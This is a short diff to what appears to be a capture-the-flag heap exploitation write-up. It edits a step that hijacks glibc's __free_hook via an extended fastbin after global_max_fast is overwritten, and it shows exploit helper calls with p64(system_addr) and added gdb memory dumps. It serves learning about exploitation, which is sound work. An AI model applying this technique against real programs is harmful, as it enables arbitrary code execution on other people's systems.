@@ -106,11 +106,15 @@ We can write a large value to global_max_fast with the following command.
 0x7ffff7dcf950 <root>:	0x0000000000000000	0x0000000000000000
 ```
 
-We write to the extended fastbin with the following command.
+We can write the heap address to _free_hook with the following command. And we write to the extended fastbin with the following command.
 > Lose(2)
 > 
 > Change(0, p64(system_addr))
 ```asm
+0x7ffff7dcf8d8 <_IO_stdfile_0_lock+8>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dcf8e8 <__free_hook>:	0x0000555555757250	0x0000000000000000
+0x7ffff7dcf8f8 <next_to_use.11807>:	0x0000000000000000	0x0000000000000000
+
 0x555555757250:	0x0000000000000000	0x0000000000003951
 0x555555757260:	0x00007ffff7a31550	0x747461206e696220
 0x555555757270:	0x00000000216b6361	0x0000000000000000
